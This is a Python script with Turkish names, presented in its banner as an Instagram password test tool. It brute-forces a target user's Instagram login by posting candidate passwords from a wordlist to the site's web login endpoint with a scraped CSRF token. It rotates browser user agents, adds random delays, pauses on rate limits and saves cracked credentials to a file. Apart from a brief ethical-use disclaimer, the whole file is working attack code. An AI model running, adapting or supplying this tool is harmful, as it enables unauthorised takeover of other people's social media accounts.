import requests
import re
import asyncio
import time
import random
import json
from aiohttp import ClientSession, ClientTimeout, TCPConnector
import os
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Renk kodları
class Renkler:
    BASLIK = '\033[95m'
    MAVI = '\033[94m'
    CYAN = '\033[96m'
    YESIL = '\033[92m'
    SARI = '\033[93m'
    KIRMIZI = '\033[91m'
    SON = '\033[0m'
    KALIN = '\033[1m'
    ALTI_CİZİLİ = '\033[4m'
    
    # Root prompt ekleme
    ROOT_PROMPT = '\033[1;31m[root@ighacker]\033[0m '

# Ayarlar
VARSayıLAN_KULLANICI_AGENTI = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36"
INSTAGRAM_APP_ID = "936619743392459"
ISTEK_ZAMAN_ASIMI = 30
MAX_DENEME = 3
GECIKME_SURESI = 1  # saniye

def banner_goster():
    print(f"""{Renkler.YESIL}
██╗███╗░░██╗░██████╗████████╗░█████╗░░██████╗░██████╗░░█████╗░███╗░░░███╗
██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝░██╔══██╗██╔══██╗████╗░████║
██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░██╗░██████╔╝███████║██╔████╔██║
██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
██║██║░╚███║██████╔╝░░░██║░░░██║░░██║╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
{Renkler.SON}{Renkler.CYAN}
██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██║░░██║██╔══██╗██╔══██╗██║░██╔╝
███████║███████║██║░░╚═╝█████═╝░
██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
{Renkler.SON}{Renkler.MAVI}
[*] 🚀 Gelişmiş Instagram Şifre Test Aracı  
[*] 👨‍💻 Geliştirici: Gökhan Yakut  
[*] 📞 İletişim: +44 7833 319922  
[*] 🛠️ Sürüm: 2.0  |  📅 Yayın Tarihi: 26.05.2025
[*] ⚠️ SORUMLULUK REDDİ:Dikkat: Bu araç yalnızca etik hackleme ve güvenlik testleri için kullanılmalıdır!
[*] 🔐 Tüm yasal sorumluluk kullanıcıya aittir.
{Renkler.SON}""")

def sifre_olustur(password):
    zaman_damgasi = int(time.time())
    return f"#PWD_INSTAGRAM_BROWSER:0:{zaman_damgasi}:{password}"

def rastgele_kullanici_agent():
    kullanici_agentleri = [
        VARSayıLAN_KULLANICI_AGENTI,
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(kullanici_agentleri)

class InstagramOturumu:
    def __init__(self):
        self.csrf_token = None
        self.cihaz_id = None
        self.kullanici_agent = rastgele_kullanici_agent()
        self.oturum = requests.Session()
        self.oturum.verify = False

    def oturum_verilerini_al(self):
        basliklar = {
            'Host': 'www.instagram.com',
            'User-Agent': self.kullanici_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        }

        for deneme in range(MAX_DENEME):
            try:
                yanit = self.oturum.get('https://www.instagram.com/', headers=basliklar)
                
                # CSRF tokenını çerezlerden al
                self.csrf_token = yanit.cookies.get('csrftoken')
                
                # Cihaz ID'sini HTML'den al
                cihaz_id_eslesme = re.search(r'"device_id":"([a-zA-Z0-9\-]+)"', yanit.text)
                if cihaz_id_eslesme:
                    self.cihaz_id = cihaz_id_eslesme.group(1)
                
                if self.csrf_token and self.cihaz_id:
                    return True
                
            except Exception as hata:
                print(f"{Renkler.ROOT_PROMPT}{Renkler.SARI}[!] Oturum denemesi {deneme + 1} başarısız: {str(hata)}{Renkler.SON}")
                time.sleep(GECIKME_SURESI)
        
        return False

class InstagramSifreKirici:
    def __init__(self, kullanici_adi, sifre_listesi):
        self.kullanici_adi = kullanici_adi
        self.sifre_listesi = sifre_listesi
        self.bulundu = False
        self.denemeler = 0
        self.baslangic_zamani = time.time()

    async def giris_dene(self, oturum, sifre, csrf_token, cihaz_id, kullanici_agent):
        cerezler = {
            'csrftoken': csrf_token,
            'ig_did': cihaz_id,
        }

        basliklar = {
            'Host': 'www.instagram.com',
            'X-CSRFToken': csrf_token,
            'X-IG-App-ID': INSTAGRAM_APP_ID,
            'User-Agent': kullanici_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
        }

        veri = {
            'enc_password': sifre_olustur(sifre),
            'username': self.kullanici_adi,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
        }

        try:
            async with oturum.post(
                'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                cookies=cerezler,
                headers=basliklar,
                data=veri,
                timeout=ClientTimeout(total=ISTEK_ZAMAN_ASIMI)
            ) as yanit:
                sonuc = await yanit.json()
                self.denemeler += 1
                
                if sonuc.get('authenticated', False):
                    print(f"{Renkler.ROOT_PROMPT}{Renkler.YESIL}[+] Başarılı! Kullanıcı: {self.kullanici_adi} | Şifre: {sifre}{Renkler.SON}")
                    self.bulundu = True
                    return True
                elif 'checkpoint_url' in sonuc:
                    print(f"{Renkler.ROOT_PROMPT}{Renkler.YESIL}[+] Başarılı (Doğrulama gerekli)! Kullanıcı: {self.kullanici_adi} | Şifre: {sifre}{Renkler.SON}")
                    self.bulundu = True
                    return True
                elif sonuc.get('message') == 'rate limited':
                    print(f"{Renkler.ROOT_PROMPT}{Renkler.KIRMIZI}[!] Çok fazla istek gönderildi. 30 saniye bekleniyor...{Renkler.SON}")
                    await asyncio.sleep(30)
                    return False
                else:
                    print(f"{Renkler.ROOT_PROMPT}{Renkler.SARI}[-] Deneme {self.denemeler}: {sifre} - Başarısız{Renkler.SON}")
                    return False
                    
        except Exception as hata:
            print(f"{Renkler.ROOT_PROMPT}{Renkler.KIRMIZI}[!] Hata: {str(hata)}{Renkler.SON}")
            return False

    async def calistir(self):
        # Oturumu başlat
        insta_oturum = InstagramOturumu()
        if not insta_oturum.oturum_verilerini_al():
            print(f"{Renkler.ROOT_PROMPT}{Renkler.KIRMIZI}[!] Oturum başlatılamadı{Renkler.SON}")
            return

        print(f"{Renkler.ROOT_PROMPT}{Renkler.CYAN}[*] {self.kullanici_adi} kullanıcısına saldırı başlatılıyor...{Renkler.SON}")

        # aiohttp oturumunu hazırla
        baglayici = TCPConnector(limit=10)
        zaman_asimi = ClientTimeout(total=ISTEK_ZAMAN_ASIMI)
        
        async with ClientSession(connector=baglayici, timeout=zaman_asimi) as oturum:
            for sifre in self.sifre_listesi:
                if self.bulundu:
                    break
                    
                await self.giris_dene(
                    oturum,
                    sifre,
                    insta_oturum.csrf_token,
                    insta_oturum.cihaz_id,
                    insta_oturum.kullanici_agent
                )
                
                # Rastgele gecikme
                await asyncio.sleep(random.uniform(0.5, 1.5))

        # Sonuçlar
        gecen_zaman = time.time() - self.baslangic_zamani
        print(f"\n{Renkler.ROOT_PROMPT}{Renkler.MAVI}[*] İşlem {gecen_zaman:.2f} saniyede tamamlandı")
        print(f"{Renkler.ROOT_PROMPT}[*] Toplam deneme: {self.denemeler}")
        if self.bulundu:
            print(f"{Renkler.ROOT_PROMPT}{Renkler.YESIL}[+] Şifre bulundu!{Renkler.SON}")
            with open('bulunanlar.txt', 'a', encoding='utf-8') as dosya:
                dosya.write(f"{self.kullanici_adi}:{sifre}\n")
        else:
            print(f"{Renkler.ROOT_PROMPT}{Renkler.KIRMIZI}[-] Şifre bulunamadı{Renkler.SON}")

def sifre_listesi_yukle(dosya_yolu):
    try:
        with open(dosya_yolu, 'r', errors='ignore', encoding='utf-8') as dosya:
            return [satir.strip() for satir in dosya if satir.strip()]
    except FileNotFoundError:
        print(f"{Renkler.ROOT_PROMPT}{Renkler.KIRMIZI}[!] Hata: Dosya bulunamadı{Renkler.SON}")
        return None

def main():
    banner_goster()
    
    parser = argparse.ArgumentParser(description='Instagram Şifre Kırma Aracı')
    parser.add_argument('-k', '--kullanici', help='Hedef Instagram kullanıcı adı')
    parser.add_argument('-s', '--sifreler', help='Şifre listesi dosyası')
    args = parser.parse_args()

    kullanici = args.kullanici if args.kullanici else input(f"{Renkler.ROOT_PROMPT}{Renkler.MAVI}[?] Kullanıcı adı: {Renkler.SON}")
    sifre_dosyasi = args.sifreler if args.sifreler else input(f"{Renkler.ROOT_PROMPT}{Renkler.MAVI}[?] Şifre listesi: {Renkler.SON}")

    sifreler = sifre_listesi_yukle(sifre_dosyasi)
    if not sifreler:
        return

    kirici = InstagramSifreKirici(kullanici, sifreler)
    asyncio.run(kirici.calistir())

if __name__ == "__main__":
    main()